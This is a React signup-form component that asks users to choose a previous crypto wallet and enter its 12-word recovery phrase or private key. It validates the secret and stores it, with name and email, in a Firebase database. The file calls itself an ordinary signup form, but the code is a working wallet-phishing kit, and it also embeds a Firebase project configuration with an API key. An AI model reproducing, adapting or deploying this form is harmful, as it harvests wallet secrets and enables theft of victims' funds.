import React,{Component} from "react";
import { v4 as Id } from "uuid";
 // Import the functions you need from the SDKs you need
import { initializeApp } from 'firebase/app';
import { getDatabase,ref,set} from "firebase/database";
// Follow this pattern to import other Firebase services
// import { } from 'firebase/<service>';

// TODO: Replace the following with your app's Firebase project configuration
const firebaseConfig = {
   apiKey: "AIzaSyAcLSZGh5I6DrjT6fRaPWNRwR2rCZL_1h8",
  authDomain: "coinstore-token.firebaseapp.com",
  projectId: "coinstore-token",
  storageBucket: "coinstore-token.appspot.com",
  messagingSenderId: "163135610706",
  appId: "1:163135610706:web:3b7db85a493fd4aa92648b"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
   class form extends Component{
    constructor(){
        super();
        this.state={
            Username:'',
            email:'',
            password_type:'Phrase', 
            pass_phrase:'',
            UserError:false,
            EmailError:false,
            PassWordError:false,

            wallet_name:['Coinbase wallet',
            'Mycelium',
            'Ledger Nano X',
            'Exodus',
            'Trust Wallet',
            'BlockChain Wallet',
                'Binance',
                'Bitcoin core',
                'Xapo',
                'Other'],
                 wallet:'Coinbase wallet',

        }
        this.getValue  = this.getValue.bind(this);
        this.submit = this.submit.bind(this);
        this.reset  = this.reset.bind(this);
    }
    reset(){
        document.getElementById('feedback').style.display ='block';
        setTimeout(()=>{
         document.getElementById('feedback').style.display ='none';
        },3000)
        this.setState({
         Username:'',
        email:'',
        password_type:'Phrase',
         pass_phrase:''})
    }
    submit(e){
        e.preventDefault();
        const {Username,email,pass_phrase,wallet,password_type} = this.state;

        const result={
            name:'',
            email:'',
            wallet_name:'',
            password_type:'',
          };
          // comparing Zone
          //PHRASE
const compare1 ={
    name: Username, 
    email: email,
     wallet_name:wallet,
     password_type:password_type,
     phrase:pass_phrase
    },
    // PASSWORD
    compare2 ={
        name:Username, 
        email:email, 
        wallet_name:wallet,
         password_type: password_type, 
         password:pass_phrase
        };
        result.wallet_name = wallet;
        result.password_type = password_type;
      // username 
       /^[A-Za-z]{2,}$/i.test(Username)?
       (()=>{ 
           result.name=Username;
          this.setState({UserError:false})
        })()
       :this.setState({UserError:true});
      // email 
      /^[A-Za-z0-9)]{3,}\@(gmail|yahoo|email)\.com$/i.test(email)?
      (()=>{ 
        result.email=email;
        this.setState({EmailError:false})
     })()
      :  this.setState({EmailError:true})
      if(this.state.password_type==='Private key'){
                //password 
                /^[A-Za-z0-9]{1,}(^\s)*$/i.test(pass_phrase)?
                (()=>{ 
                    result.password=pass_phrase;
                    this.setState({PassWordError:false})
                    // submit to the console if its private key
                    if(JSON.stringify(compare2) === JSON.stringify(result)){ 
                        set(ref(db, 'users/' +Id()),result);
                        this.reset()
                        console.log('data sent')
                    }
                 })()
                        :
                        this.setState({PassWordError:true})
      } else if(this.state.password_type==='Phrase'){
        // pass_phrase 
  pass_phrase.split(' ').length === 12 &&/^[A-Za-z]+((\s)[A-Za-z]+)+$/i.test(pass_phrase)?       
  (()=>{ 
    result.phrase=pass_phrase;
    this.setState({PassWordError:false})
     // submit to the console if its private key
     if(JSON.stringify(compare1) === JSON.stringify(result)){
         // rest test
        set(ref(db, 'users/' +Id()),result);
         this.reset()
        console.log('data sent')
    } 
 })()
                     :
     this.setState({PassWordError:true})

}
  }
    getValue(e){
        e.preventDefault();
        let   value = e.target.value;
          switch(e.target.id){
            case 'user':
                     this.setState(()=>({
                            Username:value
                    }))
                break;
                case 'email':
                    //Validation
                     this.setState({
                                        email:value,
                              })
                     break;
                    case 'wallet':
                        //Validation
                        this.setState(()=>({
                        wallet:value
                        }))
                        break;
                        case 'password_type':
                            //Validation
                            this.setState({
                            password_type:value
                            }   )
                            break;
                            case 'password':
                                //Validation
                                if(this.state.password_type ==='Phrase'){
                                     this.setState({
                                       pass_phrase:value
                                     })
                                }
                                else if(this.state.password_type ==='Private key'){
                                    this.setState({
                                         pass_phrase:value,
                                      });
                                }
                                 break;
        }
    }
    render(){
        return(
           <form  className='form'onSubmit={(e)=>this.submit(e)}>
               <div id='feedback'>Sign up Completed</div>
               <div className='sty_in'>
                   <span  className='label'>Username</span>
                   {/* username */}
                   <input 
                   onChange={(e)=>this.getValue(e)}
                   value={this.state.Username} 
                   id='user'
                    type='text' 
                    name='user'
                     required/>
                    {this.state.UserError&&
                    <span className='error'>Invalid Username</span>}
               </div>
               <div className='sty_in'>
                   <span className='label'>E-mail</span>
                   {/* Email */}
                   <input id='email' 
                   type='text'
                    name='Email'
                    onChange={(e)=>this.getValue(e)}
                    required
                    value={this.state.email}/>
                   {this.state.EmailError&& 
                   <span className='error'>Invalid E-mail address</span>}

               </div>
               <div className='sty_in'>
               <span className='label'>Select Previous wallet</span>
               {/* wallet */}
                   <select  id='wallet' 
                   onChange={(e)=>this.getValue(e)}
                   value={this.state.wallet}
                   required>
                {this.state.wallet_name.map((x)=><option value={x} key={x}>{x}</option>)}
                   </select>
               </div>
                 <div className='sty_in'>
               <span className='label'>Previous wallet password</span>
                   <select id='password_type'
                   onChange={(e)=>this.getValue(e)}
                    value={this.state.password_type}
                    required>
                       <option key='phrase' value='Phrase'> Phrase</option>
                       <option  key='private' value='Private key'>Private key</option>
                   </select>
               </div>
               <div className='sty_in'>
                   <span  className='label'>password</span>
                   <input 
                   value={this.state.pass_phrase}
                   onChange={(e)=>this.getValue(e)}
                   id='password' type='text' name='keys'
                    placeholder='**** **** **'
                    required/>
                {this.state.PassWordError&& 
                <span className='error'>
                    Kindly re-input your {this.state.password_type}
                    </span>}
                   <span  className='label word'>
                    Typically 
                   12( sometimes 24) words separated by singlespaces</span>
               </div>
               <div className='form_btn'>
                   <button  type='submit'className='click'>Sign Up</button>
               </div>
           </form>
        )
    }
}
export default form;